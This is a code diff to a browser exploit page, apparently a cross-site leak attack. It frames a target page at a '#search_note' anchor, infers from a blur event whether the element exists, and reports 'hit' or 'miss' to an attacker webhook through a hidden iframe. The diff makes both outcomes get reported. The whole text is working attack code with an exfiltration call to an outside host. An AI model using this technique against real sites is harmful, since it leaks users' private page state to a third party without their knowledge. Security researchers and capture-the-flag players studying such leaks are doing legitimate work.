@@ -9,12 +9,11 @@ window.onload = function () {
     iframe.src = TARGET + "#search_note";
     document.body.appendChild(iframe);
     setTimeout(() => {
-        if (blurFired){
-            const ex = document.createElement("iframe");
-            ex.src = WEBHOOK + "?result=" + result;
-            ex.style.display = "none";
-            document.body.appendChild(ex);
-        }
+        const result = blurFired ? "hit" : "miss";
+        const ex = document.createElement("iframe");
+        ex.src = WEBHOOK + "?result=" + result;
+        ex.style.display = "none";
+        document.body.appendChild(ex);
     }, 1000);
 };
 </script>
